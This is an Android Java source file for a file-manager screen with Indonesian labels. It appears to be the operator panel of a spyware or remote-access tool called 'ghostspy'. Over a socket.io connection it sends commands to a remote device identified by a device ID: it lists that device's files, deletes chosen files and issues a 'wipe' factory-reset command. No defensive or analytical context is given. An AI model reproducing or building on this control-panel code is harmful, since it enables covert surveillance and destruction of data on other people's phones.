package com.testapp;

import android.app.Activity;
import android.app.AlertDialog;
import android.os.Bundle;
import android.view.Gravity;
import android.widget.*;
import io.socket.client.IO;
import io.socket.client.Socket;
import org.json.JSONArray;
import org.json.JSONObject;
import java.net.URISyntaxException;
import java.io.File;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class FileManagerActivity extends Activity {
    private LinearLayout fileContainer;
    private String currentPath = "/sdcard";
    private TextView pathText;
    private Socket socket;
    private String deviceId;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        deviceId = getIntent().getStringExtra("deviceId");

        LinearLayout root = new LinearLayout(this);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setBackgroundColor(0xFF090909);
        setContentView(root);

        // Header
        LinearLayout header = new LinearLayout(this);
        header.setOrientation(LinearLayout.HORIZONTAL);
        header.setGravity(Gravity.CENTER_VERTICAL);
        header.setBackgroundColor(0xFF171717);
        header.setPadding(16, 12, 16, 12);

        Button backBtn = new Button(this);
        backBtn.setText("←");
        backBtn.setTextColor(0xFFFFFFFF);
        backBtn.setBackgroundColor(0x00000000);
        backBtn.setOnClickListener(v -> finish());
        header.addView(backBtn);

        TextView title = new TextView(this);
        title.setText("File Manager");
        title.setTextColor(0xFFFFFFFF);
        title.setTextSize(18);
        title.setTypeface(null, android.graphics.Typeface.BOLD);
        LinearLayout.LayoutParams titleParams = new LinearLayout.LayoutParams(
                0, LinearLayout.LayoutParams.WRAP_CONTENT, 1);
        title.setLayoutParams(titleParams);
        header.addView(title);

        Button refreshBtn = new Button(this);
        refreshBtn.setText("🔄");
        refreshBtn.setTextColor(0xFFFFFFFF);
        refreshBtn.setBackgroundColor(0x00000000);
        refreshBtn.setOnClickListener(v -> requestFiles(currentPath));
        header.addView(refreshBtn);
        root.addView(header);

        // Path & Up
        LinearLayout breadcrumbBar = new LinearLayout(this);
        breadcrumbBar.setOrientation(LinearLayout.HORIZONTAL);
        breadcrumbBar.setPadding(16, 8, 16, 8);

        pathText = new TextView(this);
        pathText.setText(currentPath);
        pathText.setTextColor(0xFF9AA3B2);
        pathText.setTextSize(12);
        breadcrumbBar.addView(pathText);

        Button upBtn = new Button(this);
        upBtn.setText("⬆");
        upBtn.setTextColor(0xFFFFFFFF);
        upBtn.setBackgroundColor(0x00000000);
        upBtn.setOnClickListener(v -> {
            if (!currentPath.equals("/")) {
                File parent = new File(currentPath).getParentFile();
                if (parent != null) {
                    currentPath = parent.getAbsolutePath();
                    requestFiles(currentPath);
                }
            }
        });
        breadcrumbBar.addView(upBtn);
        root.addView(breadcrumbBar);

        // Daftar file
        ScrollView scroll = new ScrollView(this);
        fileContainer = new LinearLayout(this);
        fileContainer.setOrientation(LinearLayout.VERTICAL);
        fileContainer.setPadding(16, 0, 16, 16);
        scroll.addView(fileContainer);
        root.addView(scroll);

        // Tombol Reset Pabrik
        Button resetBtn = new Button(this);
        resetBtn.setText("⚠️ Reset Pabrik");
        resetBtn.setTextColor(0xFFFFFFFF);
        resetBtn.setBackgroundColor(0xFFFF1744);
        resetBtn.setOnClickListener(v -> confirmReset());
        LinearLayout.LayoutParams resetParams = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, 56);
        resetParams.setMargins(16, 8, 16, 16);
        resetBtn.setLayoutParams(resetParams);
        root.addView(resetBtn);

        // Socket
        try {
            socket = IO.socket("https://ghostspy.bruang.biz.id");
            socket.connect();
        } catch (URISyntaxException e) {}

        socket.on("files", args -> {
            try {
                String filesStr = args[0].toString();
                JSONArray files = new JSONArray(filesStr);
                runOnUiThread(() -> displayFiles(files));
            } catch (Exception e) {}
        });

        requestFiles(currentPath);
    }

    private void requestFiles(String path) {
        currentPath = path;
        pathText.setText(path);
        if (socket != null && socket.connected()) {
            JSONObject msg = new JSONObject();
            try {
                msg.put("device_id", deviceId);
                msg.put("command", "list_files");
                msg.put("params", new JSONObject().put("path", path));
                socket.emit("command", msg);
            } catch (Exception e) {}
        }
    }

    private void displayFiles(JSONArray files) {
        fileContainer.removeAllViews();
        SimpleDateFormat sdf = new SimpleDateFormat("dd/MM/yyyy HH:mm", Locale.getDefault());
        try {
            for (int i = 0; i < files.length(); i++) {
                JSONObject f = files.getJSONObject(i);
                boolean isDir = f.optBoolean("dir", false);
                String name = f.optString("name", "");
                long size = f.optLong("size", 0);
                String path = f.optString("path", "");

                LinearLayout item = new LinearLayout(this);
                item.setOrientation(LinearLayout.HORIZONTAL);
                item.setGravity(Gravity.CENTER_VERTICAL);
                item.setBackground(getDrawable(R.drawable.card_admin));
                item.setPadding(16, 12, 16, 12);
                LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(
                        LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT);
                lp.setMargins(0, 0, 0, 6);
                item.setLayoutParams(lp);

                TextView icon = new TextView(this);
                icon.setText(isDir ? "📁" : "📄");
                icon.setTextSize(24);
                icon.setPadding(0, 0, 12, 0);
                item.addView(icon);

                LinearLayout infoCol = new LinearLayout(this);
                infoCol.setOrientation(LinearLayout.VERTICAL);
                LinearLayout.LayoutParams infoParams = new LinearLayout.LayoutParams(
                        0, LinearLayout.LayoutParams.WRAP_CONTENT, 1);
                infoCol.setLayoutParams(infoParams);

                TextView nameView = new TextView(this);
                nameView.setText(name);
                nameView.setTextColor(0xFFFFFFFF);
                nameView.setTextSize(14);
                infoCol.addView(nameView);

                TextView detailView = new TextView(this);
                String detail = (isDir ? "Folder" : size + " bytes");
                detailView.setText(detail);
                detailView.setTextColor(0xFF9AA3B2);
                detailView.setTextSize(11);
                infoCol.addView(detailView);

                item.addView(infoCol);

                Button menuBtn = new Button(this);
                menuBtn.setText("⋮");
                menuBtn.setTextColor(0xFFFFFFFF);
                menuBtn.setBackgroundColor(0x00000000);
                menuBtn.setOnClickListener(v -> showFileOptions(name, path, isDir));
                item.addView(menuBtn);

                if (isDir) {
                    item.setOnClickListener(v -> requestFiles(path));
                }

                fileContainer.addView(item);
            }
        } catch (Exception e) {}
    }

    private void showFileOptions(String name, String path, boolean isDir) {
        AlertDialog.Builder b = new AlertDialog.Builder(this);
        b.setTitle(name);
        if (!isDir) {
            b.setItems(new String[]{"Hapus"}, (d, which) -> {
                if (socket != null && socket.connected()) {
                    JSONObject msg = new JSONObject();
                    try {
                        msg.put("device_id", deviceId);
                        msg.put("command", "delete_file");
                        msg.put("params", new JSONObject().put("path", path));
                        socket.emit("command", msg);
                        Toast.makeText(this, "Perintah hapus dikirim", Toast.LENGTH_SHORT).show();
                    } catch (Exception e) {}
                }
            });
        } else {
            b.setMessage("Folder");
        }
        b.setNegativeButton("Tutup", null);
        b.show();
    }

    private void confirmReset() {
        AlertDialog.Builder b = new AlertDialog.Builder(this);
        b.setTitle("Reset Pabrik");
        b.setMessage("Semua data akan dihapus. Lanjutkan?");
        b.setPositiveButton("Ya", (d, w) -> {
            if (socket != null && socket.connected()) {
                JSONObject msg = new JSONObject();
                try {
                    msg.put("device_id", deviceId);
                    msg.put("command", "wipe");
                    msg.put("params", new JSONObject());
                    socket.emit("command", msg);
                    Toast.makeText(this, "Reset pabrik dikirim", Toast.LENGTH_LONG).show();
                } catch (Exception e) {}
            }
        });
        b.setNegativeButton("Batal", null);
        b.show();
    }
}
